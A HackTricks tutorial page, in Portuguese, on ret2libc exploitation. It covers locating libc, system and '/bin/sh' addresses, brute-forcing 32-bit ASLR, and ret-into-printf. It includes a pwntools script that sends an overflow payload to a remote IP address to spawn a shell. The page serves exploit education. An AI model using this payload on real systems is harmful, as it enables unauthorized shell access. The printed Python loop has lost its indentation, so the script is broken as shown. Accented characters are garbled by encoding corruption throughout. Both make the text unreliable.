# Ret2lib

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## **Informa√ß√µes B√°sicas**

A ess√™ncia do **Ret2Libc** √© redirecionar o fluxo de execu√ß√£o de um programa vulner√°vel para uma fun√ß√£o dentro de uma biblioteca compartilhada (por exemplo, **system**, **execve**, **strcpy**) em vez de executar shellcode fornecido pelo atacante na pilha. O atacante cria uma carga √∫til que modifica o endere√ßo de retorno na pilha para apontar para a fun√ß√£o da biblioteca desejada, ao mesmo tempo que organiza os argumentos necess√°rios para serem configurados corretamente de acordo com a conven√ß√£o de chamada.

### **Passos de Exemplo (simplificados)**

* Obter o endere√ßo da fun√ß√£o a ser chamada (por exemplo, system) e o comando a ser chamado (por exemplo, /bin/sh)
* Gerar uma cadeia ROP para passar o primeiro argumento apontando para a string de comando e o fluxo de execu√ß√£o para a fun√ß√£o

## Encontrando os endere√ßos

* Supondo que a `libc` usada seja a do computador atual, voc√™ pode encontrar onde ela ser√° carregada na mem√≥ria com:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Se desejar verificar se o ASLR est√° alterando o endere√ßo da libc, voc√™ pode fazer:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Sabendo qual libc est√° sendo usada, tamb√©m √© poss√≠vel encontrar o deslocamento para a fun√ß√£o `system` com:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Sabendo qual libc est√° sendo usada, tamb√©m √© poss√≠vel encontrar o deslocamento para a fun√ß√£o da string `/bin/sh` com:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Usando gdb-peda / GEF

Sabendo a libc usada, tamb√©m √© poss√≠vel usar Peda ou GEF para obter o endere√ßo da fun√ß√£o **system**, da fun√ß√£o **exit** e da string **`/bin/sh`**:
```
p system
p exit
find "/bin/sh"
```
### Usando /proc/\<PID>/maps

Se o processo estiver criando **filhos** toda vez que voc√™ interage com ele (servidor de rede), tente **ler** esse arquivo (provavelmente voc√™ precisar√° ser root).

Aqui voc√™ pode encontrar **exatamente onde a libc est√° carregada** dentro do processo e **onde ser√° carregada** para cada filho do processo.

![](<../../../../.gitbook/assets/image (95).png>)

Neste caso, ela est√° carregada em **0xb75dc000** (Este ser√° o endere√ßo base da libc)

## Libc desconhecida

Pode ser poss√≠vel que voc√™ **n√£o saiba qual libc o bin√°rio est√° carregando** (porque pode estar localizado em um servidor onde voc√™ n√£o tem acesso). Nesse caso, voc√™ poderia abusar da vulnerabilidade para **vazar alguns endere√ßos e descobrir qual biblioteca libc** est√° sendo usada:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

E voc√™ pode encontrar um modelo do pwntools para isso em:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Bypassing ASLR em 32 bits

Esses ataques de for√ßa bruta s√£o **apenas √∫teis para sistemas de 32 bits**.

* Se o exploit for local, voc√™ pode tentar for√ßar a base de endere√ßos da libc (√∫til para sistemas de 32 bits):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Ao atacar um servidor remoto, voc√™ pode tentar **for√ßar o endere√ßo da fun√ß√£o `usleep` da `libc`**, passando como argumento 10 (por exemplo). Se em algum momento o **servidor demorar 10s extras para responder**, voc√™ encontrou o endere√ßo dessa fun√ß√£o.

## One Gadget

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## Exemplo de C√≥digo Ret2lib x86

Neste exemplo, a for√ßa bruta ASLR est√° integrada no c√≥digo e o bin√°rio vulner√°vel est√° localizado em um servidor remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Exemplo de C√≥digo x64 Ret2lib

Verifique o exemplo em:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (ou puts)

Isso permite **vazar informa√ß√µes do processo** chamando `printf`/`puts` com alguns dados espec√≠ficos colocados como argumento.

## Ret2printf

Basicamente significa abusar de um **Ret2lib para transform√°-lo em uma vulnerabilidade de strings de formato `printf`** usando o `ret2lib` para chamar printf com os valores para explor√°-lo (parece in√∫til, mas √© poss√≠vel):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
